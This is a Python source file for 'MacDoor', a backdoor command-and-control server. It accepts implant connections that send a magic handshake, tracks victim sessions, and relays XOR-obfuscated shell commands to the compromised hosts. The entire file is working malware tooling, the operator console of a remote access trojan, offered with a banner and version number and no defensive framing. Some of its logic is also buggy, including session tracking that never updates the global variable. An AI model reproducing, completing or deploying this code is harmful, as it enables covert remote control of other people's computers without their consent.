import socket, threading, sys, os, random

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 3333))
sock.listen(100)

MAGIC = bytes([0x05, 0xAA, 0x0E, 0xCC, 0xCA])
KEY = bytes([0xAA, 0xFF, 0xFA, 0xCE, 0x35, 0x57])

LOGO = """
$$\      $$\                     $$$$$$$\                                
$$$\    $$$ |                    $$  __$$\                               
$$$$\  $$$$ | $$$$$$\   $$$$$$$\ $$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$\  
$$\$$\$$ $$ | \____$$\ $$  _____|$$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$ \$$$  $$ | $$$$$$$ |$$ /      $$ |  $$ |$$ /  $$ |$$ /  $$ |$$ |  \__|
$$ |\$  /$$ |$$  __$$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      
$$ | \_/ $$ |\$$$$$$$ |\$$$$$$$\ $$$$$$$  |\$$$$$$  |\$$$$$$  |$$ |      
\__|     \__| \_______| \_______|\_______/  \______/  \______/ \__|      
                                                                         
                                                                         
                                                                        
              Version: [0.2]
              Developer: riza
"""

sessions = dict()
current_session = ""

RUNNING = True

def crypt(data, key):
	out = bytearray()

	for i in range(0, len(data)):
		out.append(data[i] ^ key[i % len(key)])

	return bytes(out)

def check_magic(data):
	return data == MAGIC

def get_id():
	return "-".join([str(random.randint(0, 255)) for _ in range(0, 4)])

def handle_client(connection):

	_CD_LOCK = False

	while True:

		prompt = "[{}]> ".format(current_session)

		if _CD_LOCK: prompt = ""

		cmd = input(prompt)

		if not cmd.strip():
			continue

		if cmd == "back":
			break

		try:
			connection.send(crypt(cmd.encode("utf-8") + bytes([0]), KEY))

			if _CD_LOCK:
				_CD_LOCK = False

		except BrokenPipeError:
			print("[!] Client %s disconnected" % current_session)
			del sessions[current_session]
			break

		if "cd" in cmd.split(" ") and len(cmd.split(" ")) > 1:
			print("Invalid cd command!")
			continue
		elif "cd" in cmd.split(" "):
			_CD_LOCK = True

		if cmd == "exit":
			del sessions[current_session]
			break

		d = connection.recv(4096)

		d = crypt(d, KEY)

		print(d.decode("utf-8"), end="")

		if not _CD_LOCK:
			print()

def server_listen():
	while RUNNING:
		conn, addr = sock.accept()

		data = conn.recv(5)

		if check_magic(data):
			conn.send(bytes([0x00]))

			_id = get_id()
			sessions[_id] = conn

			current_session = _id

			print("[*] New client with id %s connected" % _id)
		else:
			conn.send(bytes([0x01]))

threading.Thread(target=server_listen).start()

print(LOGO)

while True:
	cmd = input("[MacDoor]> ")

	if cmd == "sessions" or cmd == "ls":
		print("Active sessions:")

		for session in sessions.keys():
			print("- %s" % session)
	elif "interact" in cmd.split(" "):
		args = cmd.split(" ")

		if len(args) < 2:
			print("interact <session>")
			continue

		_id = "".join(args[1:])

		if _id in sessions.keys():
			current_session = _id
			handle_client(sessions[_id])
		else:
			print("[-] Session not found")

	